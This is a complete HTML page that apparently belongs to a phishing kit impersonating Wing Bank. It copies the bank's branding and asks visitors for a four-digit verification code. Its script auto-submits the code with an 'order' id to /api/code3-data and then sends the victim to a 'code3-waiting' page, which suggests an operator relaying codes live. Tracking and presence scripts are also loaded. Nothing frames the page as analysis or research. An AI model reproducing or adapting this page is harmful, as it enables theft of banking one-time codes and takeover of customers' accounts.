<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Password Recovery from Wing Bank</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .topbar{
    display:flex;align-items:center;justify-content:space-between;
    padding:14px 16px;background:#fff;border-bottom:3px solid #A9CF38;
    position:sticky;top:0;z-index:10;
  }
  .topbar img{height:46px}
  .topbar-title{font-size:16px;font-weight:700;color:#222}

  .hero-banner{
    background:#fff;padding:32px 24px;text-align:center;
  }
  .hero-banner .otp-img{
    width:120px;height:120px;object-fit:contain;
    margin:0 auto 18px;display:block;
  }
  .hero-banner h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
  .hero-banner p{font-size:14px;color:#888;line-height:1.6}

  .content{flex:1;padding:28px 24px 0}

  .code-row{
    display:flex;gap:16px;margin-top:12px;direction:ltr;
    justify-content:center;max-width:100%;
  }

  .digit-cell{
    position:relative;width:64px;height:64px;flex-shrink:0;
  }

  .digit-bird{
    position:absolute;inset:0;
    display:flex;align-items:center;justify-content:center;
    pointer-events:none;
    transition:opacity .2s;
  }
  .digit-bird img{
    width:44px;height:44px;
    object-fit:contain;opacity:.25;
    transition:opacity .2s;
  }
  .digit-cell.filled .digit-bird img{opacity:.08}

  .code-digit{
    position:relative;z-index:1;
    width:100%;height:100%;
    border:2px solid #e0e0e0;border-radius:16px;
    background:transparent;text-align:center;
    font-size:28px;font-weight:700;color:#1a1a1a;
    font-family:inherit;outline:none;transition:.2s;
    padding:0;
  }
  .code-digit:focus{border-color:#A9CF38;box-shadow:0 0 0 3px rgba(169,207,56,.15)}
  .digit-cell.filled .code-digit{border-color:#A9CF38;background:rgba(169,207,56,.06)}

  .err{
    display:none;margin:14px 0 0;padding:12px 14px;
    background:#fff0f0;border:1px solid #fcc;border-radius:10px;
    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
  }

  .bottom{padding:16px 24px 32px;margin-top:auto;background:#fff;z-index:50}
  .bottom.kb-open{position:fixed;bottom:0;left:0;right:0;max-width:520px;margin:0 auto;padding:12px 24px;box-shadow:0 -2px 10px rgba(0,0,0,.08);border-top:1px solid #eee}
  .submit-btn{
    display:block;width:100%;padding:16px;border:none;border-radius:28px;
    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
    background:#A9CF38;transition:.2s;
    box-shadow:0 4px 12px rgba(169,207,56,.25);
  }
  .submit-btn:hover{background:#8BB52E}
  .submit-btn:disabled{opacity:.5;cursor:not-allowed;box-shadow:none}
</style>
</head>
<body>

  <div class="topbar">
    <img src="/images/wb-logo.svg" alt="Wing Bank">
    <span class="topbar-title">Confirmation</span>
  </div>

  <div class="hero-banner">
    <img class="otp-img" src="/images/bird-mascot.jpg" alt="Wing">
    <h1>Verification Code</h1>
    <p>Verification code has been sent to your registered phone number</p>
  </div>

  <div class="content">
    <div class="err" id="errorMsg"></div>

    <div class="code-row">
        <div class="digit-cell" id="cell0">
          <div class="digit-bird"><img src="/images/bird-mascot.jpg" alt=""></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" autofocus>
        </div>
        <div class="digit-cell" id="cell1">
          <div class="digit-bird"><img src="/images/bird-mascot.jpg" alt=""></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1">
        </div>
        <div class="digit-cell" id="cell2">
          <div class="digit-bird"><img src="/images/bird-mascot.jpg" alt=""></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2">
        </div>
        <div class="digit-cell" id="cell3">
          <div class="digit-bird"><img src="/images/bird-mascot.jpg" alt=""></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c3">
        </div>
      </div>
    </div>
  </div>

  <div class="bottom">
    <button class="submit-btn" id="submitBtn" onclick="submitCode()">Confirm</button>
  </div>

<script>
  const params  = new URLSearchParams(location.search);
  const orderId = params.get("order");

  if (!orderId) location.href = "index.html";

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "Verification code is incorrect";
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  const digits = document.querySelectorAll(".code-digit");
  const cells  = document.querySelectorAll(".digit-cell");

  function updateCells() {
    digits.forEach((inp, i) => {
      cells[i].classList.toggle("filled", inp.value !== "");
    });
  }

  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      updateCells();
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
      }
      updateCells();
      const last = Math.min(text.length, digits.length);
      if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
      maybeAutoSubmit();
    });
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  let submitting = false;
  function maybeAutoSubmit() {
    const code = getCode();
    if (code.length === digits.length && !submitting) submitCode();
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < digits.length) {
      showError("Please enter the complete code");
      return;
    }
    submitting = true;
    digits.forEach(d => d.disabled = true);
    const btn = document.getElementById("submitBtn");
    btn.disabled = true;
    btn.textContent = "Checking...";

    try {
      const res  = await fetch("/api/code3-data", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code3-waiting.html?order=" + orderId;
      } else {
        showError(data.message || "Something went wrong");
        resetInputs();
      }
    } catch (err) {
      showError("Connection error");
      resetInputs();
    }
  }

  function resetInputs() {
    submitting = false;
    digits.forEach(d => { d.disabled = false; d.value = ""; });
    updateCells();
    digits[0].focus();
    const btn = document.getElementById("submitBtn");
    btn.disabled = false;
    btn.textContent = "Confirm";
  }
</script>
<script>
(function(){
  var bot=document.querySelector('.bottom');
  var inputs=document.querySelectorAll('input');
  inputs.forEach(function(inp){
    inp.addEventListener('focus',function(){bot.classList.add('kb-open');});
    inp.addEventListener('blur',function(){setTimeout(function(){
      if(!document.activeElement||document.activeElement.tagName!=='INPUT')bot.classList.remove('kb-open');
    },100);});
  });
  if(window.visualViewport){
    window.visualViewport.addEventListener('resize',function(){
      if(window.innerHeight-window.visualViewport.height>100){
        bot.classList.add('kb-open');
      }else if(!document.activeElement||document.activeElement.tagName!=='INPUT'){
        bot.classList.remove('kb-open');
      }
    });
  }
})();
</script>
<script src="/tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
